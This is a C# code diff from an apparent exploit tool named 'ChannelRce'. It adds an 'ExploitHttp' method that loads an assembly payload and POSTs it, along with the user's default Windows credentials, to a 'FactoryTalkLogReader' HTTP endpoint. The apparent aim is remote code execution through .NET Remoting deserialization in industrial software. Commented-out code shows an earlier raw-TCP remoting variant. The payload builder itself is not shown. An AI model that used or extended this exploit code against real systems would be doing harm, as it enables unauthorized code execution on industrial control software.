@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Net;
+using System.Net.Http;
 using System.Net.Security;
 using System.Net.Sockets;
 using System.Runtime.Remoting.Messaging;
@@ -280,6 +281,88 @@ namespace ChannelRce
             return;
 
         }
+
+
+        static async Task<string> ExploitHttp(int asm_index, int asm_end, bool newmode)
+        {
+            Console.WriteLine("Exploit " + asm_index);
+            // Uri _uri = new Uri("tcp://127.0.0.1:57777/IONServicesProviderFactory.soap", UriKind.Absolute);
+            Uri _uri = new Uri("http://localhost:7147/FactoryTalkLogReader");
+
+
+
+            HttpClientHandler handler = new HttpClientHandler();
+            handler.UseDefaultCredentials = true;
+
+            // Create an HttpClient object
+            HttpClient client = new HttpClient(handler);
+
+            HttpRequestMessage req = new HttpRequestMessage(HttpMethod.Post, _uri);
+            // req.Headers.Add("Content-Type", "application/octet-stream");
+
+            /*TcpClient client = new TcpClient();
+
+            client.Connect(_uri.Host, _uri.Port);
+
+            Stream ret = client.GetStream();
+
+
+            /*NegotiateStream stm = new NegotiateStream(ret);
+            NetworkCredential cred = CredentialCache.DefaultNetworkCredentials;
+
+            stm.AuthenticateAsClient(cred, String.Empty, ProtectionLevel.EncryptAndSign, TokenImpersonationLevel.Impersonation);
+
+            ret = stm;
+            #1#
+
+            //  byte[] data = SerializeObject();
+            */
+
+
+
+            byte[] data = LoadAsmTorce(asm_index, asm_end, newmode);
+
+            MemoryStream stm1 = new MemoryStream();
+            BinaryWriter writer = new BinaryWriter(stm1);
+            /*TcpMessageWriter messageWriter = new TcpMessageWriter(writer);
+
+            messageWriter.WritePreamble(OperationType.Request, data.Length);
+            messageWriter.WriteContentTypeHeader("application/octet-stream");
+
+            messageWriter.WriteRequestUriHeader(_uri);
+            messageWriter.WriteCustomHeader("__RequestUri", _uri.LocalPath);
+
+            messageWriter.WriteEndHeader();*/
+
+            writer.Write(data);
+
+            using (MemoryStream netStream = new MemoryStream())
+            {
+                using (BinaryWriter netWriter = new BinaryWriter(netStream))
+                {
+                    netWriter.Write(stm1.ToArray());
+                    netStream.Position = 0;
+                    req.Content = new StreamContent(netStream, (int)netStream.Length);
+
+                    HttpResponseMessage response = await client.SendAsync(req);
+
+
+                    Console.WriteLine("response.StatusCode " + response.StatusCode);
+                    /*BinaryReader reader = new BinaryReader(netStream);
+                    object obj = ParseResult(reader);*/
+                    string retstr = await response.Content.ReadAsStringAsync();
+
+                    //  Console.WriteLine(retstr);
+
+                    return retstr;
+
+                }
+            }
+
+            return "";
+
+        }
+
 
         static void Help()
         {
